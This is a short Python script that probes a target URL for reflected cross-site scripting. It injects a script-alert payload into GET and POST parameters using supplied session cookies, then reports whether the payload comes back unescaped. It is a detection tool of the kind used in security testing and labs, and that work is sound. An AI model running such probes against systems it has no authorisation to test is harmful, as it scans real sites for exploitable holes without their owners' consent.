import requests
import argparse

def check_reflected_xss(url, get_param_value, cookie_session_name, cookie_session_value, session_security_name, session_security_value, show_response_text=False):
    # Craft payload
    payload = "<script>alert('XSS')</script>"
    
    # Construct the GET parameter URL with the payload
    get_full_url = url + "?" + get_param_value + "=" + payload
    print("GET Request URL:", get_full_url)  # Print the GET URL being requested
    # Create a session object
    session = requests.Session()
    # Add the session cookie to the session object
    session.cookies.set(cookie_session_name, cookie_session_value)
    session.cookies.set(session_security_name, session_security_value)
    # Send GET request with payload
    get_response = session.get(get_full_url)
    
    # Construct the POST payload data dictionary
    post_payload_data = {get_param_value: payload}
    # Send POST request with payload
    post_response = session.post(url, data=post_payload_data)
    
    # Check if payload is reflected in GET response
    if payload in get_response.text:
        print("Reflected XSS found on GET request:", url)
        if show_response_text:
            print("GET Response Content:", get_response.text)  # Display full GET response text
    else:
        print("No reflected XSS found on GET request:", url)

    # Check if payload is reflected in POST response
    if payload in post_response.text:
        print("Reflected XSS found on POST request:", url)
        if show_response_text:
            print("POST Response Content:", post_response.text)  # Display full POST response text
    else:
        print("No reflected XSS found on POST request:", url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Check for reflected XSS vulnerabilities')
    parser.add_argument('--url', type=str, help='Target website URL')
    parser.add_argument('--param_value', type=str, help='GET parameter value')
    parser.add_argument('--cookie_name', type=str, help='Session cookie name')
    parser.add_argument('--cookie_value', type=str, help='Session cookie value')
    parser.add_argument('--security_name', type=str, help='Session security name')
    parser.add_argument('--security_value', type=str, help='Session security value')
    parser.add_argument('--show_response_text', action='store_true', help='Display response text')
    args = parser.parse_args()
    
    if args.url is None:
        args.url = input("Enter the target website URL: ")
    if args.param_value is None:
        args.param_value = input("Enter the GET parameter value: ")
    if args.cookie_name is None:
        args.cookie_name = input("Enter the session cookie name: ")
    if args.cookie_value is None:
        args.cookie_value = input("Enter the session cookie value: ")
    if args.security_name is None:
        args.security_name = input("Enter the session security name: ")
    if args.security_value is None:
        args.security_value = input("Enter the session security value: ")
    
    check_reflected_xss(args.url, args.param_value, args.cookie_name, args.cookie_value, args.security_name, args.security_value, args.show_response_text)
